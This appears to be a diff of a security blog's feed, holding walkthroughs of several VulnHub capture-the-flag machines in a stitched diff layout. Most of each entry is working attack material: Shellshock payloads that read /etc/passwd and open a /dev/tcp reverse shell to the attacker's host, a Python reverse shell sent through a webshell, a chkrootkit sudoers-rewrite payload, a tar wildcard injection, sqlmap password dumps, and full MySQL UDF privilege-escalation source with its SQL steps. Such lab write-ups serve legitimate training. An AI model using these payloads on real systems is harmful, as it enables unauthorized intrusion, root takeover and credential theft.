-<p><img src="/images/blog/vulhub/sickos1.2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>After enumeration, find the system has chkrootkit:</p>
-
-<p><code>dpkg -l | grep chkrootkit</code></p>
-
-<p>chkrootkit verions is 0.49 and it is vulnerable.</p>
-
-<p><code>searchsploit chkrootkit</code></p>
-
-<p><code>echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update</code></p>
-
-<p>also need to change the privilages on the update file with chmod 777 and wait:</p>
-
-<p><code>ls -al /etc/sudoers</code></p>
-
-<p>try:</p>
-
-<p><code>sudo su</code></p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[sickos:1.1]]></title>
-    <link href="http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1/"/>
-    <updated>2016-05-18T12:50:37-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1</id>
-    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
-
-<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Metasploit</li>
-<li>FoxyProxy</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.178 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.178 -p-</code></p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like port 22 and port 3218 are openning. Port 3218 is running Squid. open msfconsole, search squid. I found that:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Then use this module to scan the squid service:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like port 80 is opened:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Use FoxyProxy add-on to configure proxy:</p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now visit <a href="http://192.168.79.178">http://192.168.79.178</a></p>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now let&rsquo;s use nikto to scan the server:</p>
-
-<pre><code>nikto -h localhost -useproxy http://192.168.79.178:3128
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>looks like there is a shellshock vuln</p>
-
-<p>Let&rsquo;s test it:</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sickos/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>It works and looks  there is an account sickos.</p>
-
-<p>Now lets setup reverse shell.</p>
-
-<p>netcat-style shell access without netcat:</p>
-
-<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>
-
-<p>in one terminal:</p>
-
-<p><code>nc -nlvp 4444</code></p>
-
-<p>in another terminal:</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.79.173/4444 0&lt;&amp;1" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
-</code></pre>
+<p><code>http://192.168.41.163/scriptz/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
 
 <p>get the shell:</p>
 
-<p><img src="/images/blog/vulhub/sickos/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+<p><img src="/images/blog/vulhub/pipe/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>After Enumeration, got a interesting file: <code>/var/www/wolfcms/config.php</code></p>
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
 
-<p><img src="/images/blog/vulhub/sickos/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+<p>try to find linux kernel local exploit, but I find there is no gcc in the box.</p>
 
-<p>Looks like the password is <code>john@123</code></p>
+<p>keep looking.</p>
 
-<p>SSH to the target server as sickos and use this password:</p>
+<p>find</p>
 
-<p><img src="/images/blog/vulhub/sickos/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+<p><img src="/images/blog/vulhub/pipe/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>Check sickos&rsquo;s privilege:</p>
+<p>Looks like system does backup automatically. check <code>/etc/crontab</code></p>
 
-<p><code>sudo -l</code></p>
+<p><img src="/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
 
-<p><img src="/images/blog/vulhub/sickos/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+<p><code>/usr/bin/compress.sh</code> can be read</p>
 
-<p>Looks like it can run as root</p>
+<p>I find the tar uses wild card. Here I will try Tar arbitrary command execution.</p>
 
-<p><img src="/images/blog/vulhub/sickos/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+<p><img src="/images/blog/vulhub/pipe/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>YES</p>
+<p>first check which shell is being use in target</p>
+
+<p><code>ls -al /bin/*sh</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>start to create shell:</p>
+
+<pre><code>www-data@pipe:/home/rene/backup$ echo &gt; --checkpoint=1;                    
+www-data@pipe:/home/rene/backup$ echo &gt; --checkpoint-action=exec=sh\ shell.sh;                     
+www-data@pipe:/home/rene/backup$ echo 'chmod u+s /bin/dash' &gt; shell.sh
+www-data@pipe:/home/rene/backup$ echo 'touch /home/rene/backup/done' &gt;&gt; shell.sh                     
+www-data@pipe:/home/rene/backup$ cat shell.sh
+chmod u+s /bin/dash
+touch /home/rene/backup/done
+www-data@pipe:/home/rene/backup$ chmod +x shell.sh
+</code></pre>
+
+<p>just wait a few miniutes and a file <code>done</code> will be created</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>run <code>/bin/dash</code> and get the shell</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Csharp: VulnJson]]></title>
-    <link href="http://wg135.github.io/blog/2016/05/05/csharp-vulnjson/"/>
-    <updated>2016-05-05T15:44:32-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/05/05/csharp-vulnjson</id>
-    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
+    <title type="html"><![CDATA[the wall]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/18/the-wall/"/>
+    <updated>2016-08-18T14:23:31-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/18/the-wall</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
 
-<h3>Tools:</h3>
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wireshark</li>
+<li>Netcat</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Hash-identifier</li>
+<li>Hashcat</li>
+<li>Steghide</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.162 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.162 -p-</code></p>
+
+<p>However, no port is opening.</p>
+
+<p>use wireshark to check the traffic</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find the target send packet to TCP port 1337 in my Kali.</p>
+
+<p><code>nc -nlvp 1337</code></p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>nothing cool shows.</p>
+
+<p>rerun nmap, find port 80 is opening now</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I use wfuzz and nikto and find nothing.</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The webpage just show a image. check the source code:</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an interesting string. <code>737465673d3333313135373330646262623337306663626539373230666536333265633035</code></p>
+
+<p>use Hash-identifier cannot figure out what&rsquo;s encode type. Finally, I find it is hex encode in hackbar. Hex decode to character, get</p>
+
+<p><code>steg=33115730dbbb370fcbe9720fe632ec05</code></p>
+
+<p>use Hash-identifier to find out <code>33115730dbbb370fcbe9720fe632ec05</code> is a MD5</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use hashcat to crack it.</p>
+
+<p><code>hashcat hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get password is <code>divisionbell</code></p>
+
+<p>Now I want to check the image to see if there is any hiden information</p>
+
+<p><code>steghide extract -p divisionbell -sf pink_floyd.jpg</code></p>
+
+<p>get the result:</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0</code> is very interesting. <code>|</code> separates the string into two parts.</p>
+
+<p><code>U3lkQmFycmV0dA==</code> is base64 encoded, decode it, <code>SydBarrett</code></p>
+
+<p><code>f831605ae34c2399d1e5bb3a4ab245d0</code> is MD5. crack it.</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>its <code>pinkfloydrocks</code></p>
+
+<p>now what, remember enumerate, enumerate and enumerate.</p>
+
+<p>rerun nmap again,</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 1965 is opening and running ssh</p>
+
+<p>login using SydBarrett/pinkfloydrocks.</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>shows This service allows sftp connections only</p>
+
+<p>use sftp to login</p>
+
+<p><code>sftp -P 1965 SydBarrett@192.168.41.162</code></p>
+
+<p>check the files</p>
+
+<p><code>sftp&gt; ls -ahl</code></p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the file eclipsed_by_the_moon</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>tar zxvf eclipsed_by_the_moon</code></p>
+
+<p><code>foremost -v -i eclipsed_by_the_moon.lsd</code></p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got a jpg file. <code>Roger Waters</code></p>
+
+<p>open it</p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>and his password is <code>hello_is_there_anybody_in_there</code></p>
+
+<p>based on previous username <code>SydBarrett</code>, Roger Waters user name should be <code>RogerWaters</code></p>
+
+<p><code>ssh RogerWaters@192.168.41.162 -p 1965</code></p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check sticky bit set</p>
+
+<pre><code>find / -perm -u=s -type f -user DavidGilmour 2&gt;/dev/null
+find / -perm -u=s -type f -user NickMason 2&gt;/dev/null
+ls -al /usr/local/bin/shineon 
+ls -al /usr/local/bin/brick
+</code></pre>
+
+<p><img src="/images/blog/vulhub/wall/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>/usr/local/bin/brick</code> has sticky bit set.</p>
+
+<p>run it</p>
+
+<p><code>/usr/local/bin/brick</code></p>
+
+<p><img src="/images/blog/vulhub/wall/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Lord the Root]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/12/lord-the-root/"/>
+    <updated>2016-08-12T13:50:04-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/12/lord-the-root</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
 
 <ul>
 <li>netdiscover</li>
 <li>Nmap</li>
 <li>Wfuzz</li>
-<li>Burp</li>
+<li>Nikto</li>
+<li>Burpsuite</li>
 <li>Sqlmap</li>
 </ul>
 
 
+<h3>Vulnerabilities:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/39166/">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &lsquo;overlayfs&rsquo; Local Root Exploit (1)</a></li>
+<li><a href="https://www.exploit-db.com/exploits/1518/">MySQL 4.x/5.0 - User-Defined Function (UDF) Local Privilege Escalation Exploit (Linux)</a></li>
+</ul>
+
+
 <!--more-->
 
 
 <p>Use netdiscover to detect target IP address</p>
 
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/lordroot/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
 
-<p><img src="/images/blog/vulhub/vulnjson/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.175 is the target.</p>
+<p>192.168.41.159 is the target.</p>
 
 <p>Then run nmap to detect opening ports and running services on the target machine.</p>
 
-<p><code>nmap -sV -v -O -A -T5 192.168.79.175 -p-</code></p>
+<p><code>nmap -sV -v -O -A -T5 192.168.41.159 -p-</code></p>
 
-<p><img src="/images/blog/vulhub/vulnjson/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+<p><img src="/images/blog/vulhub/lordroot/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>Use wfuzz to burte force hidden path of the server</p>
+<p>Only port 22 is opening.</p>
 
-<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.175/FUZZ 2&gt;/dev/null
+<p>try to ssh to the box and check the banner</p>
+
+<p><code>ssh root@192.168.41.159</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a hint Easy as 1,2,3</p>
+
+<p>looks like port knocking, now try to send packet to port 1, 2 and 3 using <a href="https://github.com/wg135/script/blob/master/port_knocking.py">port knocking</a> script.</p>
+
+<p>run nmap again,</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 1337 is openning and it is running http service.</p>
+
+<p>I used both nikto and wfuzz, nothing interesting come out.</p>
+
+<p>check the page</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the image info,</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an <code>/images/</code>, go to the directory.</p>
+
+<p>nothing cool. check the source code find a <code>/icons/</code>.</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check <code>http://192.168.41.159:1337/robots.txt</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I check <code>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</code> and it is base64 encoded.</p>
+
+<p>Decode it in hackbar, I get:</p>
+
+<p><code>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</code></p>
+
+<p>This is also base64 encoded.</p>
+
+<p>Decode it again,</p>
+
+<p><code>/978345210/index.php</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>save the post requst in burpsuit as file post.txt</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>username is vulnerable.</p>
+
+<p>get table name</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql --tables</code></p>
+
+<p>webapp database
+<img src="/images/blog/vulhub/lordroot/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>mysql
+<img src="/images/blog/vulhub/lordroot/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get columns of webapp</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users --columns</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>dump username and password</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users -C username,password --dump</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get colums of table user</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user --columns</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user -C User,Password --dump</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try to login web using credential, however, I cannot find anywhere to upload webshell.</p>
+
+<p>I try the credential to login ssh</p>
+
+<p>and <code>smeagol  | MyPreciousR00t</code> works</p>
+
+<h3>Local exploit 1:</h3>
+
+<p><code>uname -a</code></p>
+
+<p>then get:</p>
+
+<p><code>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</code></p>
+
+<p><code>searchsploit Linux Kernel | grep Ubuntu</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<pre><code>wget http://192.168.41.149/39166.c
+gcc 39166.c -o local
+./local
 </code></pre>
 
-<p><img src="/images/blog/vulhub/vulnjson/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+<p>get the root</p>
 
-<p>looks like /bin is a hidden path. Lets check it.</p>
+<p><img src="/images/blog/vulhub/lordroot/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
 
-<p><img src="/images/blog/vulhub/vulnjson/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+<h3>Local exploit 2:</h3>
 
-<p>Sqlmap tips</p>
+<p><code>ps aux |grep root</code></p>
 
-<p>from <a href="https://vimeo.com/96799028">Marudhamaran Gunasekaran</a></p>
+<p><img src="/images/blog/vulhub/lordroot/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
 
-<pre><code>How do I test a log in protected website with sqlmap?
-use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
-How do I test a website with sqlmap that requires authentication?
-use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
-How do I test a website with sqlmap that uses JSON data?
-automatically works with JSON
-How do I test a website with sqlmap that uses XML data?
-use the custom injection paramter pointer *
-How do I test a website with sqlmap that uses SSL?
-use the --force-ssl parameter
-How do I tell sqlmap to try harder?
-use the --level and --risk parameters
-How do I automate a sql map scan?
-use the --batch and --crawl 3
+<p>mysql is running under the root, which is wrong!</p>
+
+<p>login mysql</p>
+
+<p><code>mysql -u root -p</code>, password is <code>darkshadow</code>, and the mysql version is 5.5.44.</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit mysql | grep local</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>follow the instruction <code>https://www.exploit-db.com/exploits/1518/</code></p>
+
+<p>use the c code:(1518.c)</p>
+
+<pre><code class="c">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
+
+typedef struct st_udf_args {
+    unsigned int        arg_count;  // number of arguments
+    enum Item_result    *arg_type;  // pointer to item_result
+    char            **args;     // pointer to arguments
+    unsigned long       *lengths;   // length of string args
+    char            *maybe_null;    // 1 for maybe_null args
+} UDF_ARGS;
+
+typedef struct st_udf_init {
+    char            maybe_null; // 1 if func can return NULL
+    unsigned int        decimals;   // for real functions
+    unsigned long       max_length; // for string functions
+    char            *ptr;       // free ptr for func data
+    char            const_item; // 0 if result is constant
+} UDF_INIT;
+
+int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
+{
+    if (args-&gt;arg_count != 1)
+        return(0);
+
+    system(args-&gt;args[0]);
+
+    return(0);
+}
+
+char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{
+    return(0);
+}
 </code></pre>
 
-<p>go to the <a href="http://192.168.79.175,">http://192.168.79.175,</a> then search the users and use burp to record the traffic.</p>
-
-<p><img src="/images/blog/vulhub/vulnjson/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Then click the traffic content in the burp and right click it and copy to file, name it as test.txt.</p>
-
-<p><img src="/images/blog/vulhub/vulnjson/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Then in the terminal, we try:</p>
-
-<pre><code>sqlmap -r test.txt  --level 5 --risk 3 --threads 10 -p "username" --dump
+<pre><code>gcc -g -c 1518.c
+gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
 </code></pre>
 
-<p>since there is a parameter username in the post request, so we use that as a parameter for sqlmap</p>
+<p>in mysql</p>
 
-<p><img src="/images/blog/vulhub/vulnjson/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+<pre><code>mysql&gt; use mysql
+mysql&gt; create table foo(line blob);
+mysql&gt; insert into foo values(load_file('/tmp/1518.so'));
+mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
+mysql&gt; create function do_system returns integer soname '1518.so';
+mysql&gt; select * from mysql.func;
+mysql&gt; select do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out');
+mysql&gt; \! sh
+$ cat /tmp/out
+</code></pre>
 
-<p>Now the sqlmap dump all items I created.</p>
+<p><img src="/images/blog/vulhub/lordroot/Selection_024.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>DONE</p>
+<p>exploit is good. now use <a href="https://github.com/wg135/script/blob/master/suid.c">suid.c</a></p>
+
+<p>in mysql:</p>
+
+<pre><code>mysql&gt; select do_system('gcc -o /tmp/suid /tmp/suid.c');
+mysql&gt; select do_system('chmod u+s /tmp/suid');
+</code></pre>
+
+<p>in /tmp</p>
+
+<p><code>./suid</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_025.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hackademic RTB2]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/10/hackademic-rtb2/"/>
+    <updated>2016-08-10T15:38:10-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/10/hackademic-rtb2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Joomscan</li>
+<li>Metasploit</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/rtb2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.158 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.158 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like port 80 is opening and port 666 is filtered.</p>
+
+<p>Use both wfuzz to scan the host</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find <code>phpmyadmin</code></p>
+
+<p>check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn&rsquo;t work. Now step back, enumerate more.</p>
+
+<p>I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use wfuzz scan again</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the webpage <code>http://192.168.41.158:666/</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like it is joomla</p>
+
+<p>now use Joomba to scan the app</p>
+
+<p><code>joomscan -u http://192.168.41.158:666/</code></p>
+
+<p>nothing cool comes out.</p>
+
+<p>use metasploit</p>
+
+<p><code>search joomla</code></p>
+
+<p>I use <code>auxiliary/scanner/http/joomla_plugins</code></p>
+
+<pre><code>msf &gt; use auxiliary/scanner/http/joomla_plugins
+msf auxiliary(joomla_plugins) &gt; set rhosts 192.168.41.158
+msf auxiliary(joomla_plugins) &gt; set rport 666
+msf auxiliary(joomla_plugins) &gt; run
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use <code>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>
+
+<p>so first step, verify the sql injection:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then try to get column number:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 1--</code>
+<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 2--</code>
+<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 3--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>the column number is 2</p>
+
+<p>next find out which column we can use</p>
+
+<p><code>158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,2--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Okay. Column 2</p>
+
+<p>try to check mysql version</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,@@version--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get all table name</p>
+
